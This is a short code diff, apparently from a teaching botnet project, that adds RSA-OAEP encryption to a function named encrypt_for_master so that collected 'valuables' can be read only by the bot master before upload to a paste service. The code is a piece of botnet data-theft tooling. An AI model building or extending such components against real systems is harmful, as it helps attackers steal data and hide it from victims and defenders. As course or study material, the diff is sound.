@@ -2,6 +2,7 @@ import os
 from Crypto.Signature import PKCS1_PSS
 from Crypto.Hash import SHA256
 from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_OAEP
 
 # Verification key
 verification_key = """ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDMXG
@@ -24,7 +25,10 @@ def save_valuable(data):
 
 def encrypt_for_master(data):
     # Encrypt the file so it can only be read by the bot master
-    return data
+    key = RSA.importKey(open('skynet_encrypt.public').read())
+    cipher = PKCS1_OAEP.new(key)
+    encrypted_data = cipher.encrypt(data)
+    return encrypted_data
 
 def upload_valuables_to_pastebot(fn):
     # Encrypt the valuables so only the bot master can read them
